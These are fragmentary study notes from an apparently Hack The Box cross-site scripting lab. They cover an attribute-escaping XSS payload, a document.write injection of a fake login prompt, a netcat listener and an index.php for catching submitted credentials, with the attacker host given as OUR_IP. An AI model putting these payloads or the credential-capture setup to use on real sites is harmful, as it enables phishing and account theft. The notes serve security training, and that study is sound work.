    ...
    <img src='<script>alert(window.origin)</script>'>        </div> 

to get this script to work, you need to escape out of the<span style="color:rgb(255, 0, 0)"> src=</span> 
That is done by adding '> at the beginning of the java code, because the src= end with those symbols so the code inteprets it as finished and the pastes in the javascript code we actually want not as a link. 
...
OUR_IP is the ip of your own machine 
...
```
<span style="color:rgb(255, 0, 0)">(Worked after I put it between 2 script tags!!!!!)</span> -> <script>"document.write('<h3>Please..."</script>  
...
```shell-session
Pangulin@htb[/htb]$ sudo nc -lvnp 80
listening on [any] 80 ...
```
...
Pangulin@htb[/htb]$ vi index.php #at this step we wrote our index.php file
